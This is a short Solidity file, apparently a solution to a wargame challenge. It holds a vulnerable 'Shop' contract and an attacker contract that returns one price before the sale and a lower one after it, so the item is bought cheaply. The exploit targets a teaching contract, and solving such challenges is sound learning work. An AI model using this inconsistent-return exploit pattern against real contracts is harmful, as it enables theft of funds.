```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```
ssadd
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

  interface IShop {
    function buy() external;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
  }

  contract BuyMAXXXXER {

      IShop public shop;

      constructor(address _shop) {
        shop = IShop(_shop);
      }

      function price() external view returns (uint256) {
        if (shop.isSold()) {
          return 1;
        }
        return 100;
      }

      function ATTAAACKKK() external {
        shop.buy();
      }
    }
```
